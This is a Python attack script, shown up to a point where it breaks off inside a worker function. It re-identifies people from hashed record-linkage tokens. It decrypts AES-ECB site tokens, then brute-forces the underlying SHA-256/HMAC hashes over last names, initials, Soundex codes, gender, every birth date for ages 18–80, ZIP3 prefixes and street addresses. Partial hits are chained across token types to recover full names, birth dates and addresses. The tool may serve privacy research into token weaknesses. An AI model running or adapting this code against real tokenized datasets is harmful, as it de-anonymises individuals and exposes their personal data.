#!/usr/bin/env python3
import argparse
import base64
import csv
import hashlib, hmac
import multiprocessing
from functools import partial
from collections import defaultdict
from datetime import datetime, date
from typing import Dict, Any, Iterable, Tuple, Set, Optional
from jellyfish import soundex
from Crypto.Cipher import AES
import pandas as pd
import time

# =============================
# Normalization / helpers
# =============================

# --- Maps for American Soundex (as used by jellyfish.soundex) ---
AM_CODE_MAP = {
    b'b': '1', b'p': '1', b'f': '1', b'v': '1',
    b'c': '2', b's': '2', b'g': '2', b'j': '2', b'k': '2', b'q': '2', b'x': '2', b'z': '2',
    b'd': '3', b't': '3',
    b'l': '4',
    b'm': '5', b'n': '5',
    b'r': '6',
}
AM_INV_CODE_MAP = {
    '1': [b'b', b'p', b'f', b'v'],
    '2': [b'c', b's', b'g', b'j', b'k', b'q', b'x', b'z'],
    '3': [b'd', b't'],
    '4': [b'l'],
    '5': [b'm', b'n'],
    '6': [b'r'],
}
AM_ZERO_CODE_B = [b'a', b'e', b'i', b'o', b'u', b'y', b'h', b'w']
# -----------------------------------------------------------------

ALL_ALPHABET_B = [bytes([c]) for c in range(ord('a'), ord('z')+1)]

HASHES = 0
def digest_and_count(h):
    global HASHES
    HASHES += 1
    return h.digest()

def norm(s: Any) -> str:
    return "".join(ch for ch in str(s or "").strip().lower() if ch.isalnum())

def norm_gender(g: Any) -> str:
    g = str(g or "").strip().lower()
    if g in ("m", "male"): return "m"
    if g in ("f", "female"): return "f"
    return "u"

def norm_dob(s: Any) -> str:
    s = str(s or "").strip()
    fmts = ("%Y-%m-%d", "%d.%m.%Y", "%m/%d/%Y", "%Y/%m/%d", "%Y%m%d")
    for f in fmts:
        try:
            return datetime.strptime(s, f).strftime("%Y%m%d")
        except ValueError:
            pass
    if len(s) == 8 and s.isdigit():
        return s
    return ""

def first_initial(fn: str) -> str:
    n = norm(fn)
    return n[0] if n else ""

def first3(fn: str) -> str:
    n = norm(fn)
    return n[:3] if n else ""

def split_address(address, lang: str):
    address = str(address).strip()
    if not address: return ""
    parts = address.split()
    if lang == "de":
        for i, part in enumerate(parts):
            if part and part[0].isdigit():
                street = " ".join(parts[:i]).strip().replace("-", "").replace(" ", "")
                return street
        return " ".join(parts).strip().replace("-", "").replace(" ", "")
    elif lang == "us":
        if parts and parts[0].isdigit():
            street = " ".join(parts[1:]).strip().replace("-", "").replace(" ", "")
        else:
            street = " ".join(parts).strip().replace("-", "").replace(" ", "")
        return street
    return address.strip().replace("-", "").replace(" ", "")

def split_address_b(address: str, lang: str) -> Tuple[bytes, bytes]:
    s = (address or "").strip()
    if not s: return b"", b""
    parts = s.replace("-", " ").split()
    chunks = ["".join(ch for ch in p.lower() if ch.isalnum()) for p in parts if p]
    if not chunks: return b"", b""
    if lang == "us":
        if chunks[0] and chunks[0][0].isdigit():
            number = chunks[0].encode()
            street = "".join(chunks[1:]).encode()
            return street, number
    num_idx = None
    for i, p in enumerate(chunks):
        if p and p[0].isdigit():
            num_idx = i; break
    if num_idx is None:
        return "".join(chunks).encode(), b""
    street = "".join(chunks[:num_idx]).encode()
    number = "".join(chunks[num_idx:]).encode()
    return street, number

# =============================
# Improve computation speed
# =============================
TOP_FIRST: list = []
TOP_LAST: list = []
TOP_ADDRESS: list = []
SEX = ["m","f","u"]
SEX_B = [b"m", b"f", b"u"]
SEP = b"|"
INITIALS_B = [bytes([c]) for c in range(ord('a'), ord('z')+1)]

def to_bytes_list(xs):
    return [norm(x).encode("utf-8") for x in xs if str(x).strip()]

def precompute_dobs(min_year, max_year):
    dobs = []
    for y in range(min_year, max_year + 1):
        leap = (y % 4 == 0) and (y % 100 != 0 or y % 400 == 0)
        mdays = (31, 29 if leap else 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31)
        for m, dmax in enumerate(mdays, 1):
            for d in range(1, dmax + 1):
                dobs.append(f"{y:04d}{m:02d}{d:02d}".encode("utf-8"))
    return dobs

def build_soundex_maps(TOP_FIRST_B, TOP_LAST_B):
    FN_BY_INITIAL = defaultdict(list)
    FN_BY_SDX     = defaultdict(list)
    LN_BY_SDX     = defaultdict(list)
    sdx_last_set  = set()
    sdx_first_set = set()
    for ln_b in TOP_LAST_B:
        if not ln_b: continue
        try: sdx_last = soundex(ln_b.decode("utf-8"))
        except: continue
        if sdx_last:
            sdx_last_set.add(sdx_last)
            LN_BY_SDX[sdx_last].append(ln_b)
    for fn_b in TOP_FIRST_B:
        if not fn_b: continue
        FN_BY_INITIAL[fn_b[:1]].append(fn_b)
        try: sdx_fn = soundex(fn_b.decode("utf-8"))
        except: continue
        if sdx_fn:
            sdx_first_set.add(sdx_fn)
            FN_BY_SDX[sdx_fn].append(fn_b)
    SDX_LAST   = sorted(sdx_last_set)
    SDX_FIRST  = sorted(sdx_first_set)
    SDX_LAST_B  = [c.encode("utf-8") for c in SDX_LAST]
    SDX_FIRST_B = [c.encode("utf-8") for c in SDX_FIRST]
    return FN_BY_INITIAL, FN_BY_SDX, LN_BY_SDX, SDX_LAST, SDX_FIRST, SDX_LAST_B, SDX_FIRST_B

def make_init_hasher(master_salt: bytes | None):
    if master_salt is None:
        def init_hasher(prefix=b""):
            h = hashlib.sha256()
            if prefix: h.update(prefix)
            return h
    else:
        def init_hasher(prefix=b""):
            return hmac.new(master_salt, prefix, hashlib.sha256)
    return init_hasher

ZIP3_PARTS = [f"{z:03d}".encode("utf-8") for z in range(1000)]

def precompute_house_numbers(lang: str, max_de=500, max_us=1000):
    if lang == "de": return [f"{n}".encode("utf-8") for n in range(1, max_de+1)]
    if lang == "us": return [f"{n}".encode("utf-8") for n in range(1, max_us+1)]
    return []

def build_first3_map(first_names_b):
    m = defaultdict(list)
    for fn in first_names_b:
        if fn: m[fn[:3]].append(fn)
    return m

def precompute_all_soundex_codes() -> Tuple[Set[bytes], Set[bytes]]:
    initials = [bytes([c]) for c in range(ord('a'), ord('z') + 1)]
    digits = [bytes([c]) for c in b'123456']
    all_sdx_ln, all_sdx_fn = set(), set()
    for initial in initials:
        sdx_prefix = initial.decode().upper().encode()
        all_sdx_ln.add(sdx_prefix + b'000')
        all_sdx_fn.add(sdx_prefix + b'000')
        for d1 in digits:
            all_sdx_ln.add(sdx_prefix + d1 + b'00')
            all_sdx_fn.add(sdx_prefix + d1 + b'00')
            for d2 in digits:
                all_sdx_ln.add(sdx_prefix + d1 + d2 + b'0')
                all_sdx_fn.add(sdx_prefix + d1 + d2 + b'0')
                for d3 in digits:
                    sdx_code = sdx_prefix + d1 + d2 + d3
                    all_sdx_ln.add(sdx_code)
                    all_sdx_fn.add(sdx_code)
    return all_sdx_ln, all_sdx_fn

def generate_soundex_preimages(soundex_code: str, max_length: int) -> Iterable[bytes]:
    """
    (SMART GENERATOR - NO MEMOIZATION)
    Generates all name strings (up to max_length) that match the
    American Soundex code. Only yields "complete" names.
    This version removes memoization to prevent memory crashes.
    """
    if not soundex_code or not soundex_code[0].isalpha() or len(soundex_code) != 4:
        return
    initial_char_b = soundex_code[0].lower().encode()
    initial_code = AM_CODE_MAP.get(initial_char_b)
    digits_to_match = soundex_code[1:].replace('0', '')
    memo = set()  

    def _generate(
        current_name_b: bytes,
        last_code_seen: Optional[str],
        remaining_digits: str,
        consecutive_zeros: int,
        in_suffix_mode: bool
    ):
        state = (current_name_b, ...)  
        if state in memo: return       
        memo.add(state)                

        if in_suffix_mode:
            yield current_name_b
        if len(current_name_b) >= max_length:
            return
        if in_suffix_mode:
            for char_b in ALL_ALPHABET_B:
                if len(current_name_b) + len(char_b) <= max_length:
                    yield from _generate(current_name_b + char_b, None, "", 0, True)
            return
        if consecutive_zeros < 2:
            for char_b in AM_ZERO_CODE_B:
                if len(current_name_b) + len(char_b) <= max_length:
                    yield from _generate(
                        current_name_b + char_b,
                        last_code_seen,
                        remaining_digits,
                        consecutive_zeros + 1,
                        False
                    )
        if last_code_seen:
            for char_b in AM_INV_CODE_MAP.get(last_code_seen, []):
                 if len(current_name_b) + len(char_b) <= max_length:
                    yield from _generate(
                        current_name_b + char_b,
                        last_code_seen,
                        remaining_digits,
                        0, 
                        False
                    )
        next_digit_to_match = remaining_digits[0] if remaining_digits else None
        if next_digit_to_match:
            for char_b in AM_INV_CODE_MAP.get(next_digit_to_match, []):
                if next_digit_to_match != last_code_seen:
                    if len(current_name_b) + len(char_b) <= max_length:
                        yield from _generate(
                            current_name_b + char_b,
                            next_digit_to_match,
                            remaining_digits[1:],
                            0,
                            False
                        )
        else:
            if len(current_name_b) >= 1:
                yield current_name_b
            for char_b in ALL_ALPHABET_B:
                 if len(current_name_b) + len(char_b) <= max_length:
                    yield from _generate(
                        current_name_b + char_b,
                        None, 
                        "",   
                        0,
                        True
                    )
    yield from _generate(initial_char_b, initial_code, digits_to_match, 0, False)

# =============================
# Master token functions
# =============================
def master_sha256(token_input: str) -> bytes:
    h = hashlib.sha256()
    h.update(token_input.encode("utf-8"))
    return digest_and_count(h)

def master_hmac(master_salt: bytes, token_input: str) -> bytes:
    h = hmac.new(master_salt, token_input.encode("utf-8"), hashlib.sha256)
    return digest_and_count(h)

def parse_bytes(s: str, *, expect_len: Optional[int] = None) -> bytes:
    try: b = bytes.fromhex(s)
    except ValueError: b = s.encode("utf-8")
    if expect_len is not None and len(b) != expect_len:
        raise ValueError(f"Expected {expect_len} bytes, got {len(b)}")
    return b

# =============================
# Site encryption (AES-ECB)
# =============================
def aes256_ecb_decrypt_b64(site_key_32: bytes, token_b64: str) -> bytes:
    ct = base64.b64decode(token_b64)
    if len(ct) % 16 != 0: raise ValueError("Ciphertext not multiple of AES block size.")
    cipher = AES.new(site_key_32, AES.MODE_ECB)
    pt = cipher.decrypt(ct)
    return pt

# =============================
# Load and decrypt site tokens
# =============================
def load_site_tokens(path: str, cols: Iterable[str]) -> Dict[str, list]:
    with open(path, newline="", encoding="utf-8") as f:
        r = csv.DictReader(f)
        rows = list(r)
    return {"_RAW": rows}

def decrypt_columns(rows: list, site_key_32: bytes, colnames: Iterable[str]) -> Dict[str, Set[bytes]]:
    out: Dict[str, Set[bytes]] = {c: set() for c in colnames}
    successes, failures = 0, 0
    for row in rows:
        for c in colnames:
            val = (row.get(c) or "").strip()
            if not val: continue
            try:
                mt = aes256_ecb_decrypt_b64(site_key_32, val)
                out[c].add(mt)
                successes += 1
            except Exception: failures += 1
    for c in colnames:
        print(f"[decrypt] {c}: unique master tokens={len(out[c])} (successes={successes}, failures={failures})")
    return out

# =============================
# Attack core - Dictionary/Reference Based
# =============================

today = date.today()
min_age, max_age = 18, 80
min_year, max_year = today.year - max_age, today.year - min_age

def attack_T1_fast(master_tokens, lastnames_b, initials_b, dobs_b, init_hasher):
    hits = {}
    contains = master_tokens.__contains__
    for ln in lastnames_b:
        h_ln = init_hasher(ln + SEP)
        for fi in initials_b:
            h_fi = h_ln.copy(); h_fi.update(fi + SEP)
            for g in SEX_B:
                h_sig = h_fi.copy(); h_sig.update(g + SEP)
                for dob in dobs_b:
                    h = h_sig.copy(); h.update(dob)
                    mt = digest_and_count(h)
                    if contains(mt): hits[mt] = (ln, fi, g, dob)
    return hits

def attack_T1_via_T2(master_tokens, sdx_ln_b, sdx_fn_b, g_b, dob_b, LN_BY_SDX, init_hasher):
    """
    (DICTIONARY-BASED)
    Use LN_BY_SDX map to get candidate last names from the dictionary,
    then test T1 candidates.
    """
    hits = {}
    contains = master_tokens.__contains__
    try:
        sdx_ln_str = sdx_ln_b.decode("utf-8")
        sdx_fn_str = sdx_fn_b.decode("utf-8")
    except Exception: return hits
    
    cand_last_names = LN_BY_SDX.get(sdx_ln_str, []) 
    
    fi_b = sdx_fn_str[:1].lower().encode("utf-8")
    if not cand_last_names: return hits
    for ln_b in cand_last_names:
        if not ln_b: continue
        h_ln = init_hasher(ln_b + SEP)
        h_fi = h_ln.copy(); h_fi.update(fi_b + SEP)
        h_g  = h_fi.copy(); h_g.update(g_b + SEP)
        h_final = h_g.copy(); h_final.update(dob_b)
        mt = digest_and_count(h_final)
        if contains(mt): hits[mt] = (ln_b, fi_b, g_b, dob_b)
    return hits

def attack_T2_fast(master_tokens, use_sdx_last_b, use_sdx_first_b, dobs_b, init_hasher):
    hits = {}
    contains = master_tokens.__contains__
    for sdx_ln in use_sdx_last_b:
        h_ln = init_hasher(sdx_ln + SEP)
        for sdx_fn in use_sdx_first_b:
            h_fn = h_ln.copy(); h_fn.update(sdx_fn + SEP)
            for g in SEX_B:
                h_sig = h_fn.copy(); h_sig.update(g + SEP)
                for dob in dobs_b:
                    h = h_sig.copy(); h.update(dob)
                    mt = digest_and_count(h)
                    if contains(mt): hits[mt] = (sdx_ln, sdx_fn, g, dob)
    return hits

def attack_T2_via_T1(master_tokens, SDX_FIRST, ln_b, fi_b, g_b, dob_b, last_to_sdx, init_hasher):
    hits = {}
    contains = master_tokens.__contains__
    sdx_ln = last_to_sdx.get(ln_b)
    if not sdx_ln:
        try: sdx_ln = soundex(ln_b.decode("utf-8"))
        except: return hits
    if not sdx_ln: return hits
    sdx_ln_b = sdx_ln.encode("utf-8")
    initial_upper = fi_b[:1].decode(errors="ignore").upper()
    if not initial_upper: return hits
    cand_sdx_first_b = [c.encode("utf-8") for c in SDX_FIRST if c and c[0] == initial_upper]
    if not cand_sdx_first_b: return hits
    h_ln = init_hasher(sdx_ln_b + SEP)
    for sdx_fn_b in cand_sdx_first_b:
        h_fn = h_ln.copy(); h_fn.update(sdx_fn_b + SEP)
        h_g  = h_fn.copy(); h_g.update(g_b + SEP)
        h_final = h_g.copy(); h_final.update(dob_b)
        mt = digest_and_count(h_final)
        if contains(mt): hits[mt] = (sdx_ln_b, sdx_fn_b, g_b, dob_b)
    return hits

def attack_T7_via_T1(master_tokens, ln_b, fi_b, g_b, dob_b, init_hasher):
    hits = {}
    contains = master_tokens.__contains__
    if not fi_b or len(fi_b) != 1: return hits
    h_ln = init_hasher(ln_b + SEP)
    letters = range(ord('a'), ord('z') + 1)
    for c2 in letters:
        for c3 in letters:
            fi3_b = fi_b + bytes([c2, c3])
            h_fi3 = h_ln.copy(); h_fi3.update(fi3_b + SEP)
            h_sig = h_fi3.copy(); h_sig.update(g_b + SEP)
            h_final = h_sig.copy(); h_final.update(dob_b)
            mt = digest_and_count(h_final)
            if contains(mt): hits[mt] = (ln_b, fi3_b, g_b, dob_b)
    return hits

def attack_T7_via_T2_T1(master_tokens, ln_b, sdx_fn_b, g_b, dob_b, FN_BY_SDX, init_hasher):
    hits = {}
    contains = master_tokens.__contains__
    try: sdx_fn_str = sdx_fn_b.decode("utf-8")
    except: return hits
    cand_first_names = FN_BY_SDX.get(sdx_fn_str, [])
    if not cand_first_names: return hits
    h_ln = init_hasher(ln_b + SEP)
    fi3_candidates = set(fn_b[:3] for fn_b in cand_first_names if fn_b)
    if not fi3_candidates: return hits
    for fi3_b in fi3_candidates:
        if not fi3_b: continue
        h_fi3 = h_ln.copy(); h_fi3.update(fi3_b + SEP)
        h_sig = h_fi3.copy(); h_sig.update(g_b + SEP)
        h_final = h_sig.copy(); h_final.update(dob_b)
        mt = digest_and_count(h_final)
        if contains(mt): hits[mt] = (ln_b, fi3_b, g_b, dob_b)
    return hits


def attack_T7_via_T2(master_tokens, sdx_ln_b, sdx_fn_b, g_b, dob_b, LN_BY_SDX, FN_BY_SDX, init_hasher):
    hits = {}
    contains = master_tokens.__contains__
    try:
        sdx_ln_str = sdx_ln_b.decode("utf-8")
        sdx_fn_str = sdx_fn_b.decode("utf-8")
    except Exception: return hits
    cand_last_names = LN_BY_SDX.get(sdx_ln_str, [])
    cand_first_names = FN_BY_SDX.get(sdx_fn_str, [])
    if not cand_last_names or not cand_first_names: return hits
    fi3_candidates = set(fn_b[:3] for fn_b in cand_first_names if fn_b)
    if not fi3_candidates: return hits
    for ln_b in cand_last_names:
        if not ln_b: continue
        h_ln = init_hasher(ln_b + SEP)
        for fi3_b in fi3_candidates:
            if not fi3_b: continue
            h_fi3 = h_ln.copy(); h_fi3.update(fi3_b + SEP)
            h_sig = h_fi3.copy(); h_sig.update(g_b + SEP)
            h_final = h_sig.copy(); h_final.update(dob_b)
            mt = digest_and_count(h_final)
            if contains(mt): hits[mt] = (ln_b, fi3_b, g_b, dob_b)
    return hits

def pivot_to_T4_fast(master_tokens, FN_BY_INITIAL, FN_BY_SDX, t1_hit, t2_hit, init_hasher):
    ln_b, fi_b, g_b, dob_b = t1_hit
    contains = master_tokens.__contains__
    cand_fns = FN_BY_INITIAL.get(fi_b[:1], [])
    if t2_hit is not None:
        _sdx_ln_b, sdx_fn_b = t2_hit
        try: sdx_code = sdx_fn_b.decode('utf-8')
        except: sdx_code = ""
        pool = FN_BY_SDX.get(sdx_code, [])
        if pool:
            pool_set = set(pool)
            cand_fns = [fn for fn in cand_fns if fn in pool_set]
        else: cand_fns = []
    h_ln = init_hasher(ln_b + SEP)
    hits = {}
    for fn_b in cand_fns:
        if not fn_b: continue
        h_fn = h_ln.copy(); h_fn.update(fn_b + SEP); h_fn.update(g_b + SEP)
        h = h_fn.copy(); h.update(dob_b)
        mt = digest_and_count(h)
        if contains(mt): hits[mt] = (ln_b, fn_b, g_b, dob_b)
    return hits

def pivot_to_T4_via_T7(master_tokens, ln_b, fi3_b, g_b, dob_b, FIRST3_MAP, init_hasher):
    hits = {}
    contains = master_tokens.__contains__
    prefix = fi3_b[:3]
    cand_fns = FIRST3_MAP.get(prefix, [])
    if not cand_fns: return hits
    h_ln = init_hasher(ln_b + SEP)
    for fn_b in cand_fns:
        if not fn_b: continue
        h_fn = h_ln.copy(); h_fn.update(fn_b + SEP); h_fn.update(g_b + SEP)
        h = h_fn.copy(); h.update(dob_b)
        mt = digest_and_count(h)
        if contains(mt): hits[mt] = (ln_b, fn_b, g_b, dob_b)
    return hits

def pivot_to_T4_via_T7_T2(master_tokens, sdx_ln_b, sdx_fn_b, fi3_b, g_b, dob_b, LN_BY_SDX, FN_BY_SDX, init_hasher):
    hits = {}
    contains = master_tokens.__contains__
    try:
        sdx_ln_str = sdx_ln_b.decode("utf-8")
        sdx_fn_str = sdx_fn_b.decode("utf-8")
    except Exception: return hits
    cand_last_names = LN_BY_SDX.get(sdx_ln_str, [])
    cand_first_names = FN_BY_SDX.get(sdx_fn_str, [])
    if not cand_last_names or not cand_first_names: return hits
    for ln_b in cand_last_names:
        if not ln_b: continue
        h_ln = init_hasher(ln_b + SEP)
        for fn_b in cand_first_names:
            if not fn_b or not fn_b.startswith(fi3_b): continue
            h_fn = h_ln.copy(); h_fn.update(fn_b + SEP); h_fn.update(g_b + SEP)
            h_final = h_fn.copy(); h_final.update(dob_b)
            mt = digest_and_count(h_final)
            if contains(mt): hits[mt] = (ln_b, fn_b, g_b, dob_b)
    return hits

def attack_T4(master_tokens, lastnames_b, firstnames_b, dobs_b, init_hasher):
    hits = {}
    contains = master_tokens.__contains__
    for ln in lastnames_b:
        h_ln = init_hasher(ln + SEP)
        for fn in firstnames_b:
            h_fn = h_ln.copy(); h_fn.update(fn + SEP)
            for g in SEX_B:
                h_sig = h_fn.copy(); h_sig.update(g + SEP)
                for dob in dobs_b:
                    h = h_sig.copy(); h.update(dob)
                    mt = digest_and_count(h)
                    if contains(mt): hits[mt] = (ln, fn, g, dob)
    return hits

def pivot_to_T3_fast(master_tokens, ln_b, fn_b, dob_b, init_hasher):
    contains = master_tokens.__contains__
    h0 = init_hasher(ln_b + SEP + fn_b + SEP + dob_b + SEP)
    hits = {}
    for zpart in ZIP3_PARTS:
        h = h0.copy(); h.update(zpart)
        mt = digest_and_count(h)
        if contains(mt): hits[mt] = (ln_b, fn_b, dob_b, zpart)
    return hits

def pivot_to_T9_fast(master_tokens, fn_b, address_list_raw, lang, HOUSE_NUMBERS, init_hasher):
    contains = master_tokens.__contains__
    fn_prefix = init_hasher(fn_b + SEP)
    hits = {}
    for addr_raw in address_list_raw:
        street_b, number_b_from_split = split_address_b(addr_raw, lang)
        if not street_b: continue
        full_addrs_b = []
        norm_street_only = street_b
        if lang == "de":
            for num_b in HOUSE_NUMBERS: full_addrs_b.append(norm_street_only + num_b)
            if number_b_from_split: full_addrs_b.append(norm_street_only + number_b_from_split)
            else: full_addrs_b.append(norm_street_only)
        elif lang == "us":
            for num_b in HOUSE_NUMBERS: full_addrs_b.append(num_b + norm_street_only)
            if number_b_from_split: full_addrs_b.append(number_b_from_split + norm_street_only)
            else: full_addrs_b.append(norm_street_only)
        else:
            full_addrs_b.append(street_b + number_b_from_split)
        for addr_b in set(full_addrs_b):
             if not addr_b: continue
             h = fn_prefix.copy(); h.update(addr_b)
             mt = digest_and_count(h)
             if contains(mt): hits[mt] = (fn_b, addr_b)
    return hits

# =============================
# Generator-Based Attack Functions (for Pure Brute Force)
# =============================

def attack_T1_via_T2_generator(master_tokens, sdx_ln_b, sdx_fn_b, g_b, dob_b, MAX_LN_LEN, init_hasher, max_preimages: int) -> Dict[bytes, tuple]:
    """Generate T1 candidates from a T2 preimage with an upper bound on LN preimages."""
    t1_hits = {}
    contains = master_tokens.__contains__
    try:
        sdx_ln_str = sdx_ln_b.decode("utf-8")
        sdx_fn_str = sdx_fn_b.decode("utf-8")
    except Exception: return {}
    fi_b = sdx_fn_str[:1].lower().encode("utf-8")
    
    emitted = 0
    name_generator = generate_soundex_preimages(sdx_ln_str, max_length=MAX_LN_LEN)
    
    while emitted < max_preimages:
        try:
            ln_b = next(name_generator)
            if not ln_b: continue 

            h_ln = init_hasher(ln_b + SEP)
            h_fi = h_ln.copy(); h_fi.update(fi_b + SEP)
            h_g  = h_fi.copy(); h_g.update(g_b + SEP)
            h_final = h_g.copy(); h_final.update(dob_b)
            mt = digest_and_count(h_final)
            
            if contains(mt): 
                t1_hits[mt] = (ln_b, fi_b, g_b, dob_b)
            
            emitted += 1
            
        except StopIteration:
            break 
            
    return t1_hits

def attack_T7_via_T2_generator(master_tokens, sdx_ln_b, sdx_fn_b, g_b, dob_b, MAX_LN_LEN, init_hasher, max_preimages: int):
    """(GENERATOR) Recover T7 from T2 using generator, with max_preimages cap for LNs."""
    hits = {}
    contains = master_tokens.__contains__
    try:
        sdx_ln_str = sdx_ln_b.decode("utf-8")
        sdx_fn_str = sdx_fn_b.decode("utf-8")
    except Exception: return hits

    cand_last_names = []
    emitted_ln = 0
    name_generator_ln = generate_soundex_preimages(sdx_ln_str, max_length=MAX_LN_LEN)

    while emitted_ln < max_preimages:
        try:
            ln_b = next(name_generator_ln)
            if not ln_b: 
                continue
            cand_last_names.append(ln_b)
            emitted_ln += 1
        except StopIteration:
            break
    cand_last_names = list(set(cand_last_names))
    cand_first_names_prefixes = set(p for p in generate_soundex_preimages(sdx_fn_str, max_length=3) if p)
    
    if not cand_last_names or not cand_first_names_prefixes: return hits
    
    for ln_b in cand_last_names:
        if not ln_b: continue
        h_ln = init_hasher(ln_b + SEP)
        for fi3_b in cand_first_names_prefixes:
            if not fi3_b: continue
            h_fi3 = h_ln.copy(); h_fi3.update(fi3_b + SEP)
            h_sig = h_fi3.copy(); h_sig.update(g_b + SEP)
            h_final = h_sig.copy(); h_final.update(dob_b)
            mt = digest_and_count(h_final)
            if contains(mt): hits[mt] = (ln_b, fi3_b, g_b, dob_b)
    return hits

def pivot_to_T4_via_T1_T2_generator(master_tokens, t1_preimage, t2_preimage, MAX_FN_LEN, init_hasher, max_preimages: int):
    hits = {}
    contains = master_tokens.__contains__
    (ln_b, fi_b, g_b, dob_b) = t1_preimage
    (sdx_ln_b, sdx_fn_b, _, _) = t2_preimage
    try: sdx_fn_str = sdx_fn_b.decode("utf-8")
    except Exception: return hits
    h_ln = init_hasher(ln_b + SEP)
    emitted = 0
    name_generator = generate_soundex_preimages(sdx_fn_str, MAX_FN_LEN)
    
    while emitted < max_preimages:
        try:
            fn_b = next(name_generator)
            if not fn_b: continue 
            
            h_fn = h_ln.copy(); h_fn.update(fn_b + SEP); h_fn.update(g_b + SEP)
            h_final = h_fn.copy(); h_final.update(dob_b)
            mt = digest_and_count(h_final)
            if contains(mt): hits[mt] = (ln_b, fn_b, g_b, dob_b)
            
            emitted += 1
            
        except StopIteration:
            break
    return hits

def pivot_to_T4_via_T7_T2_generator(master_tokens, sdx_ln_b, sdx_fn_b, fi3_b, g_b, dob_b, MAX_FN_LEN, MAX_LN_LEN, init_hasher, max_preimages: int):
    hits = {}
    contains = master_tokens.__contains__
    try:
        sdx_ln_str = sdx_ln_b.decode("utf-8")
        sdx_fn_str = sdx_fn_b.decode("utf-8")
    except Exception: return hits
    cand_last_names = []
    emitted_ln = 0
    ln_gen = generate_soundex_preimages(sdx_ln_str, MAX_LN_LEN)
    while emitted_ln < max_preimages:
        try:
            ln_b = next(ln_gen)
            if ln_b: cand_last_names.append(ln_b)
            emitted_ln += 1
        except StopIteration: break
    cand_last_names = list(set(cand_last_names)) 
    
    cand_first_names = []
    emitted_fn = 0
    fn_gen = generate_soundex_preimages(sdx_fn_str, MAX_FN_LEN)
    while emitted_fn < max_preimages:
        try:
            fn_b = next(fn_gen)
            if fn_b: cand_first_names.append(fn_b)
            emitted_fn += 1
        except StopIteration: break
    cand_first_names = list(set(cand_first_names)) 

    if not cand_last_names or not cand_first_names: return hits
    for ln_b in cand_last_names:
        if not ln_b: continue
        h_ln = init_hasher(ln_b + SEP)
        for fn_b in cand_first_names:
            if not fn_b or not fn_b.startswith(fi3_b): continue
            h_fn = h_ln.copy(); h_fn.update(fn_b + SEP); h_fn.update(g_b + SEP)
            h_final = h_fn.copy(); h_final.update(dob_b)
            mt = digest_and_count(h_final)
            if contains(mt): hits[mt] = (ln_b, fn_b, g_b, dob_b)
    return hits

# =============================
# Pure Brute Force Wrappers (Add Context)
# =============================

def attack_T1_via_T2_pure(master_tokens, sdx_ln_b, sdx_fn_b, g_b, dob_b, MAX_FN_LEN, MAX_LN_LEN, init_hasher, max_preimages: int):
    hits_with_context = {}
    t1_hits = attack_T1_via_T2_generator(master_tokens, sdx_ln_b, sdx_fn_b, g_b, dob_b, MAX_LN_LEN, init_hasher, max_preimages)
    t2_preimage = (sdx_ln_b, sdx_fn_b, g_b, dob_b)
    for mt, t1_preimage in t1_hits.items():
        hits_with_context[mt] = (t1_preimage, t2_preimage)
    return hits_with_context

def attack_T7_via_T1_pure(master_tokens, t1_preimage, t2_preimage, init_hasher):
    hits_with_context = {}
    (ln_b, fi_b, g_b, dob_b) = t1_preimage
    t7_hits = attack_T7_via_T1(master_tokens, ln_b, fi_b, g_b, dob_b, init_hasher) 
    for mt, t7_preimage in t7_hits.items():
        hits_with_context[mt] = (t7_preimage, t2_preimage)
    return hits_with_context

def attack_T7_via_T2_pure(master_tokens, sdx_ln_b, sdx_fn_b, g_b, dob_b, MAX_FN_LEN, MAX_LN_LEN, init_hasher, max_preimages: int):
    hits_with_context = {}
    t7_hits = attack_T7_via_T2_generator(master_tokens, sdx_ln_b, sdx_fn_b, g_b, dob_b, MAX_LN_LEN, init_hasher, max_preimages)
    t2_preimage = (sdx_ln_b, sdx_fn_b, g_b, dob_b)
    for mt, t7_preimage in t7_hits.items():
        hits_with_context[mt] = (t7_preimage, t2_preimage)
    return hits_with_context


# =============================
# Dictionaries / Distribution Loading
# =============================

def use_dictionaries(lang: str, bruteforce: bool):
    global TOP_FIRST, TOP_LAST, TOP_ADDRESS
    TOP_FIRST, TOP_LAST, TOP_ADDRESS = [], [], [] 
    street_file = "strassennamen.txt" if lang == "de" else "streetnames.txt"
    try:
        with open(street_file, "r", encoding="utf-8") as f:
            TOP_ADDRESS = [line.strip().lower() for line in f if line.strip() and not line.startswith("#")]
    except FileNotFoundError:
         print(f"[Warning] Street name file not found: {street_file}")

    if not bruteforce:
        first_file = "vornamen.txt" if lang == "de" else "firstnames.txt"
        last_file = "nachnamen.txt" if lang == "de" else "lastnames.txt"
        try:
            with open(first_file, "r", encoding="utf-8") as f:
                TOP_FIRST = [line.strip().lower() for line in f if line.strip() and not line.startswith("#")]
        except FileNotFoundError:
             print(f"[Warning] First name file not found: {first_file}")
        try:
            with open(last_file, "r", encoding="utf-8") as f:
                TOP_LAST = [line.strip().lower() for line in f if line.strip() and not line.startswith("#")]
        except FileNotFoundError:
             print(f"[Warning] Last name file not found: {last_file}")
    print(f"[*] Using hardcoded dictionaries: firsts={len(TOP_FIRST)}, lasts={len(TOP_LAST)}, addresses={len(TOP_ADDRESS)}")


def load_distribution(dist_file: str, top_n: int, bruteforce: bool):
    global TOP_FIRST, TOP_LAST, TOP_ADDRESS
    TOP_FIRST, TOP_LAST, TOP_ADDRESS = [], [], []
    try:
        df = pd.read_csv(dist_file)
    except FileNotFoundError:
        raise SystemExit(f"Error: Distribution file not found: {dist_file}")

    required_cols = ["address"]
    if not bruteforce:
        required_cols.extend(["first_name", "last_name"])

    missing = [c for c in required_cols if c not in df.columns]
    if missing:
        raise ValueError(f"Distribution file '{dist_file}' missing required columns for selected mode: {missing}")

    TOP_ADDRESS = df["address"].astype(str).str.lower().value_counts().head(top_n).index.tolist()
    if not bruteforce:
        TOP_FIRST = df["first_name"].astype(str).str.lower().value_counts().head(top_n).index.tolist()
        TOP_LAST = df["last_name"].astype(str).str.lower().value_counts().head(top_n).index.tolist()

    print(f"[*] Loaded distribution file '{dist_file}': top_n={top_n} (firsts={len(TOP_FIRST)}, lasts={len(TOP_LAST)}, addresses={len(TOP_ADDRESS)})")

# =============================
# Multiprocessing Workers
# =============================

def chunk_list(data: list, num_chunks: int) -> list:
    """Splits a list into num_chunks roughly equal chunks."""
    if not data or num_chunks <= 0: return [data]
    chunk_size = (len(data) + num_chunks - 1) // num_chunks  # Ceil division
    return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]

def attack_T1_fast_worker(
    ln_chunk: list,
    master_tokens: set,
    initials_b: list,
    dobs_b: list,
    master_salt_bytes: bytes | None
) -> Tuple[Dict[bytes, tuple], int]:
